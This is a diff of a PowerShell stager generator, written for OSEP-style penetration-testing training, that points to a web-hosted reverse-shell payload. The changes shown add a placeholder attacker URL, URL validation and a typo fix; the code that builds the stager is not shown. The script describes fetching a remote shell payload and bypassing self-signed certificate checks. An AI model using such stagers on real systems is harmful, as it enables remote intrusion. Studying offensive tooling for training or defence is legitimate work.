@@ -1,14 +1,14 @@
 ﻿function Get-Stager {
 #.SYNOPSIS
 # Simple PowerShell stager generator to point to a web hosted RevShell payload. 
-# ARBITRARY VERSION NUMBER:  2.0.0
+# ARBITRARY VERSION NUMBER:  2.0.1
 # AUTHOR:  Tyler McCann (@tylerdotrar)
 #
 #.DESCRIPTION
 # Originally developed for OSEP, this script is meant to create really simple custom stagers
 # that point to reverse shell payloads.  The only robust portion of this script is the that
-# it allows communication with HTTPS servers using self-signed certificates by preloading
-# the stager with a self-signed certificate bypass if the payload URL uses HTTPS.
+# it allows communication with the PMA server over HTTPS by preloading the stager with a 
+# self-signed certificate bypass if the payload URL uses HTTPS.
 #
 # Parameters:
 #   -PayloadURL  -->  URL pointing to the reverse shell payload
@@ -21,9 +21,9 @@
 
     Param(
         # Primary Parameters
-        [string]$PayloadURL,
+        [string]$PayloadURL = 'http(s)://<ip_addr>/d/<revshell>',
         [switch]$Base64,
-        [swtich]$Help
+        [switch]$Help
     )
     
 
@@ -31,8 +31,9 @@
     if ($Help) { return Get-Help Get-Stager }
 
 
-    # Minimum Required Params
-    if (!$PayloadURL) { return (Write-Host 'Missing reverse shell URL.' -ForegroundColor Red) }
+    # Error Correction
+    if ($PayloadURL -eq 'http(s)://<ip_addr>/d/<revshell>') { return (Write-Host 'Missing reverse shell URL.' -ForegroundColor Red) }
+    if ($PayloadURL -notlike "http*") { return (Write-Host 'Invalid URL.' -ForegroundColor Red) }
 
 
     # Randomly generate 4 - 10 character variable names
